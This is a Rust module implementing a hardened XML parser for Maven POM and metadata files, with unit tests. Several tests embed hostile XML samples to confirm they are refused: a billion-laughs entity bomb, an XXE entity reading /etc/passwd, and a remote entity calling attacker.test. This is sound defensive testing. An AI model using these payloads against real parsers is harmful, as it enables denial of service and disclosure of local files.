//! A small read-only XML tree, enough for POMs and `maven-metadata.xml`.
//!
//! Both documents are small, bounded by the call site's [`ByteLimit`], and
//! read by path rather than streamed -- a POM's parent chain and
//! `dependencyManagement` need random access to the whole document, so a
//! streaming state machine would buy nothing and cost a great deal of
//! correctness.
//!
//! [`ByteLimit`]: crate::net::ByteLimit
//!
//! # Hostile input
//!
//! These documents come off the network from repositories this tool does
//! not control, so the parser is hardened rather than merely careful. Each
//! defense below is enforced *here*, not inherited from the XML library's
//! current defaults, so that a dependency bump cannot quietly remove one.
//!
//! - **A `<!DOCTYPE>` is refused outright.** Neither a POM nor a
//!   `maven-metadata.xml` may legitimately carry one, and a document type
//!   declaration is the entry point for every entity-expansion attack --
//!   billion laughs, quadratic blowup, and the external-entity (XXE) family
//!   all need one. Refusing the declaration removes the whole class rather
//!   than defending against each shape of it.
//! - **Entities are never expanded.** Only the five XML predefined names
//!   resolve; anything else is kept verbatim as text. Even were a DOCTYPE
//!   to slip through, `&lol9;` would become six characters rather than a
//!   gigabyte.
//! - **Nothing is ever fetched.** No external entity, no schema, no
//!   `SYSTEM` identifier is resolved, so a document cannot make this
//!   process issue a request -- least of all one that would bypass the
//!   host's URL constraints.
//! - **Depth is capped**, because the tree is dropped recursively and a
//!   deeply nested document would otherwise overflow the stack on the way
//!   out.
//! - **Element count is capped**, because a few megabytes of `<a/>` would
//!   otherwise become a great many allocations. The byte length is already
//!   capped by the caller's [`ByteLimit`]; this bounds what those bytes can
//!   expand into in memory.
//!
//! Namespaces are handled by taking the local name. A POM declares a
//! default namespace, and the rare document that uses an explicit prefix
//! should read the same.
//!
//! References: [Maven repository metadata](https://maven.apache.org/ref/current/maven-repository-metadata/repository-metadata.html).

use quick_xml::Reader;
use quick_xml::escape::resolve_predefined_entity;
use quick_xml::events::Event;

/// How deep a document may nest.
///
/// A POM reaches about six. Anything approaching this is malformed or
/// hostile, and either way is better refused than followed.
const MAX_DEPTH: usize = 64;

/// How many elements a document may contain.
///
/// A `maven-metadata.xml` listing a thousand versions holds about as many
/// elements; a large POM holds a few thousand. This is far above both and
/// still bounds what a capped number of bytes can turn into in memory --
/// `<a/>` is four bytes and becomes a `Node`.
const MAX_ELEMENTS: usize = 200_000;

/// One element.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Node {
    pub name: String,

    /// The element's own text, with surrounding whitespace trimmed.
    pub text: String,

    pub children: Vec<Node>,
}

impl Node {
    /// The first child with this name.
    pub fn child(&self, name: &str) -> Option<&Node> {
        self.children.iter().find(|node| node.name == name)
    }

    /// Every child with this name.
    pub fn children(&self, name: &str) -> impl Iterator<Item = &Node> {
        self.children.iter().filter(move |node| node.name == name)
    }

    /// The text of a named child, when it has any.
    ///
    /// An empty element reads as absent rather than as an empty string:
    /// `<version></version>` in a POM means the version was not given, and
    /// treating it as the empty version would produce a request for
    /// `artifact-.jar`.
    pub fn text_of(&self, name: &str) -> Option<&str> {
        self.child(name)
            .map(|node| node.text.as_str())
            .filter(|text| !text.is_empty())
    }

    /// The element at a path of nested names.
    pub fn at(&self, path: &[&str]) -> Option<&Node> {
        path.iter().try_fold(self, |node, name| node.child(name))
    }
}

/// Parse a document into its root element.
pub fn parse(xml: &str) -> Result<Node, String> {
    let mut reader = Reader::from_str(xml);

    // Text is *not* trimmed per event, because an entity splits one run of
    // text into several: `Apache &amp; friends` arrives as `Apache `, `&`,
    // ` friends`, and trimming each piece would weld them into
    // `Apache&friends`. The pieces are concatenated and trimmed once, when
    // the element closes.
    reader.config_mut().trim_text(false);

    // The open elements, innermost last. Iterative rather than recursive,
    // so a deep document cannot overflow the stack while parsing -- only
    // while dropping, which MAX_DEPTH is what guards.
    let mut stack: Vec<Node> = Vec::new();
    let mut root: Option<Node> = None;
    let mut elements = 0usize;

    loop {
        match reader.read_event() {
            // A document type declaration is the entry point for every
            // entity-expansion attack, and no document this parser reads
            // may legitimately have one. Refused rather than ignored: a
            // POM carrying a DTD is not a POM this tool should be reading.
            Ok(Event::DocType(_)) => {
                return Err(
                    "the document carries a <!DOCTYPE> declaration, which is refused".to_owned(),
                );
            }

            Ok(Event::Start(start)) => {
                if stack.len() >= MAX_DEPTH {
                    return Err(format!("nested deeper than {MAX_DEPTH} elements"));
                }

                elements += 1;

                if elements > MAX_ELEMENTS {
                    return Err(format!("holds more than {MAX_ELEMENTS} elements"));
                }

                stack.push(Node {
                    name: local_name(start.local_name().as_ref()),
                    ..Node::default()
                });
            }

            Ok(Event::Empty(empty)) => {
                elements += 1;

                if elements > MAX_ELEMENTS {
                    return Err(format!("holds more than {MAX_ELEMENTS} elements"));
                }

                let node = Node {
                    name: local_name(empty.local_name().as_ref()),
                    ..Node::default()
                };

                match stack.last_mut() {
                    Some(parent) => parent.children.push(node),
                    None => root = Some(node),
                }
            }

            Ok(Event::End(_)) => {
                let Some(mut node) = stack.pop() else {
                    return Err("a closing tag with nothing open".to_owned());
                };

                // Indentation between child elements lands here too, so
                // what survives is the element's real text or nothing.
                node.text = node.text.trim().to_owned();

                match stack.last_mut() {
                    Some(parent) => parent.children.push(node),
                    None => root = Some(node),
                }
            }

            Ok(Event::Text(text)) => {
                let decoded = text.xml_content().map_err(|err| err.to_string())?;

                if let Some(node) = stack.last_mut() {
                    node.text.push_str(&decoded);
                }
            }

            // A POM will not carry CDATA, but a license block written by
            // hand might; dropping it silently would lose a license name.
            Ok(Event::CData(data)) => {
                // Already literal by definition, so it is decoded rather
                // than unescaped: `&amp;` inside CDATA is an ampersand
                // followed by four letters, not an entity.
                let decoded = data.decode().map_err(|err| err.to_string())?;

                if let Some(node) = stack.last_mut() {
                    node.text.push_str(&decoded);
                }
            }

            // An entity arrives as its own event rather than inside the
            // surrounding text, so it has to be resolved and stitched back
            // in -- otherwise `Apache &amp; friends` silently loses the
            // ampersand.
            Ok(Event::GeneralRef(reference)) => {
                let resolved = match reference.resolve_char_ref() {
                    Ok(Some(ch)) => ch.to_string(),
                    Ok(None) => {
                        let name = reference.decode().map_err(|err| err.to_string())?;

                        // An entity this parser cannot resolve is kept
                        // verbatim rather than dropped. Only a DTD can
                        // define one, POMs do not carry a DTD, and losing
                        // the text outright would quietly corrupt a license
                        // name instead of showing what was written.
                        resolve_predefined_entity(&name)
                            .map(str::to_owned)
                            .unwrap_or_else(|| format!("&{name};"))
                    }
                    Err(err) => return Err(err.to_string()),
                };

                if let Some(node) = stack.last_mut() {
                    node.text.push_str(&resolved);
                }
            }

            Ok(Event::Eof) => break,

            Ok(_) => {}

            Err(err) => return Err(format!("at byte {}: {err}", reader.buffer_position())),
        }
    }

    if !stack.is_empty() {
        return Err("the document ends with elements still open".to_owned());
    }

    root.ok_or_else(|| "the document has no root element".to_owned())
}

fn local_name(raw: &[u8]) -> String {
    String::from_utf8_lossy(raw).into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn element_nested_become_tree() {
        let root = parse("<a><b><c>text</c></b></a>").expect("parsed");

        assert_eq!(root.name, "a");
        assert_eq!(root.at(&["b"]).and_then(|b| b.text_of("c")), Some("text"));
    }

    #[test]
    fn element_repeated_all_kept() {
        let root = parse("<a><b>1</b><b>2</b><b>3</b></a>").expect("parsed");

        let values: Vec<&str> = root.children("b").map(|node| node.text.as_str()).collect();

        assert_eq!(values, ["1", "2", "3"]);
    }

    #[test]
    fn text_whitespace_trimmed() {
        let root = parse("<a>\n   spaced   \n</a>").expect("parsed");

        assert_eq!(root.text, "spaced");
    }

    /// An empty element means "not given", not "the empty string". A POM
    /// with `<version></version>` has no version, and reading it as one
    /// would build a request for `artifact-.jar`.
    #[test]
    fn element_empty_reads_absent() {
        let root = parse("<a><version></version><other/></a>").expect("parsed");

        assert_eq!(root.text_of("version"), None);
        assert_eq!(root.text_of("other"), None);
        assert_eq!(root.text_of("missing"), None);

        // Present as a node, though -- absence of text is not absence of the
        // element, and `dependencyManagement` distinguishes them.
        assert!(root.child("version").is_some());
        assert!(root.child("missing").is_none());
    }

    #[test]
    fn element_self_closing_is_child() {
        let root = parse("<a><b/><c>x</c></a>").expect("parsed");

        assert_eq!(root.children.len(), 2);
        assert_eq!(root.children[0].name, "b");
    }

    /// POMs declare a default namespace, and a few use an explicit prefix.
    /// Both must read the same or the prefixed ones lose every field.
    #[test]
    fn namespace_prefixes_stripped() {
        let root = parse(
            r#"<m:project xmlns:m="http://maven.apache.org/POM/4.0.0">
                 <m:artifactId>lib</m:artifactId>
               </m:project>"#,
        )
        .expect("parsed");

        assert_eq!(root.name, "project");
        assert_eq!(root.text_of("artifactId"), Some("lib"));
    }

    #[test]
    fn namespace_default_transparent() {
        let root = parse(
            r#"<project xmlns="http://maven.apache.org/POM/4.0.0">
                 <artifactId>lib</artifactId>
               </project>"#,
        )
        .expect("parsed");

        assert_eq!(root.text_of("artifactId"), Some("lib"));
    }

    /// An entity splits the surrounding text into separate events, so the
    /// spaces either side of it have to survive reassembly. `Apache &amp;
    /// friends` becoming `Apache&friends` is the failure this pins.
    #[test]
    fn entity_decoded_without_welding_text() {
        let root = parse("<a>Apache &amp; friends &lt;2.0&gt;</a>").expect("parsed");

        assert_eq!(root.text, "Apache & friends <2.0>");
    }

    #[test]
    fn entity_numeric_references_resolve() {
        let root = parse("<a>caf&#233; &#x41;</a>").expect("parsed");

        assert_eq!(root.text, "caf\u{e9} A");
    }

    /// Only a DTD can define an entity this parser does not know, and a POM
    /// carries no DTD. Keeping the reference verbatim shows what was
    /// written rather than quietly deleting part of a license name.
    #[test]
    fn entity_unknown_kept_verbatim() {
        let root = parse("<a>hard&nbsp;space</a>").expect("parsed");

        assert_eq!(root.text, "hard&nbsp;space");
    }

    /// Indentation between child elements is not the parent's text.
    #[test]
    fn text_not_indentation() {
        let root = parse("<a>\n  <b>x</b>\n  <c>y</c>\n</a>").expect("parsed");

        assert_eq!(root.text, "");
        assert_eq!(root.text_of("b"), Some("x"));
    }

    /// A hand-written license block can carry CDATA, and dropping it
    /// silently would lose the license name.
    #[test]
    fn text_cdata_kept() {
        let root = parse("<a><![CDATA[Apache License 2.0]]></a>").expect("parsed");

        assert_eq!(root.text, "Apache License 2.0");
    }

    #[test]
    fn ignore_comments_and_declarations() {
        let root = parse(
            r#"<?xml version="1.0" encoding="UTF-8"?>
               <!-- a comment -->
               <a><b>x</b><!-- another --></a>"#,
        )
        .expect("parsed");

        assert_eq!(root.name, "a");
        assert_eq!(root.children.len(), 1);
    }

    #[test]
    fn path_missing_is_none() {
        let root = parse("<a><b><c>x</c></b></a>").expect("parsed");

        assert_eq!(root.at(&["b"]).and_then(|b| b.text_of("missing")), None);
        assert_eq!(root.at(&["missing", "c"]), None);
        assert!(root.at(&["b", "c"]).is_some());
    }

    // -- Refusals ---------------------------------------------------------

    #[test]
    fn refuse_malformed_xml() {
        assert!(parse("<a><b></a>").is_err());
        assert!(parse("not xml at all").is_err());
        assert!(parse("").is_err());
        assert!(parse("<a>").is_err());
    }

    /// The tree is dropped recursively, so an adversarially deep document
    /// would overflow the stack on the way out. It is refused on the way
    /// in instead.
    #[test]
    fn refuse_absurdly_deep_document() {
        let deep = "<a>".repeat(MAX_DEPTH + 10);

        let err = parse(&deep).expect_err("should be refused");
        assert!(err.contains("nested deeper"));
    }

    // -- Hostile input ----------------------------------------------------

    /// The classic billion laughs. Each entity expands into ten of the one
    /// below it, so nine levels is a gigabyte in a naive parser.
    ///
    /// Refused at the `<!DOCTYPE>`, before any of it is read.
    #[test]
    fn refuse_billion_laughs() {
        let attack = r#"<?xml version="1.0"?>
            <!DOCTYPE lolz [
              <!ENTITY lol "lol">
              <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
              <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
              <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
              <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
              <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
              <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
              <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
              <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
              <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
            ]>
            <project>&lol9;</project>"#;

        let err = parse(attack).expect_err("must be refused");
        assert!(err.contains("DOCTYPE"), "{err}");
    }

    /// An external entity pointing at a local file. Nothing here resolves
    /// one -- the parser never reads a file or opens a socket -- but the
    /// declaration is refused anyway, so the defense does not rest on the
    /// XML library's current behavior.
    #[test]
    fn refuse_external_entity() {
        let attack = r#"<?xml version="1.0"?>
            <!DOCTYPE project [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <project><artifactId>&xxe;</artifactId></project>"#;

        assert!(
            parse(attack)
                .expect_err("must be refused")
                .contains("DOCTYPE")
        );
    }

    /// An entity pointing at a URL is the shape that would otherwise turn
    /// a parse into a network request -- and one that bypasses the host's
    /// URL constraints entirely, since it never goes through the host.
    #[test]
    fn refuse_remote_external_entity() {
        let attack = r#"<!DOCTYPE project [
              <!ENTITY probe SYSTEM "http://attacker.test/collect">
            ]>
            <project>&probe;</project>"#;

        assert!(
            parse(attack)
                .expect_err("must be refused")
                .contains("DOCTYPE")
        );
    }

    /// Even a DOCTYPE that declares nothing at all is refused. The rule is
    /// "no document type declaration", not "no dangerous-looking one" --
    /// there is no safe way to tell those apart by inspection.
    #[test]
    fn refuse_even_harmless_doctype() {
        assert!(parse("<!DOCTYPE project><project/>").is_err());
    }

    /// The second line of defense, for the case where a DOCTYPE somehow
    /// reaches the text: an undeclared entity expands to nothing at all,
    /// so a reference stays six characters rather than becoming a
    /// gigabyte.
    #[test]
    fn entity_reference_never_expands() {
        let root = parse("<a>&lol9;&lol9;</a>").expect("parsed");

        assert_eq!(root.text, "&lol9;&lol9;");
        assert_eq!(root.text.len(), 12);
    }

    /// Bytes are capped by the caller; this caps what those bytes can
    /// become in memory. `<a/>` is four bytes and a whole `Node`.
    #[test]
    fn refuse_too_many_elements() {
        let many = format!("<r>{}</r>", "<a/>".repeat(MAX_ELEMENTS + 1));

        let err = parse(&many).expect_err("must be refused");
        assert!(err.contains("more than"), "{err}");
    }

    /// A processing instruction is inert and simply ignored, rather than
    /// being mistaken for content.
    #[test]
    fn ignore_processing_instruction() {
        let root = parse(r#"<a><?target data?><b>x</b></a>"#).expect("parsed");

        assert_eq!(root.children.len(), 1);
        assert_eq!(root.text_of("b"), Some("x"));
    }

    #[test]
    fn depth_limit_still_parses() {
        let depth = MAX_DEPTH - 1;
        let xml = format!("{}{}", "<a>".repeat(depth), "</a>".repeat(depth));

        assert!(parse(&xml).is_ok());
    }
}
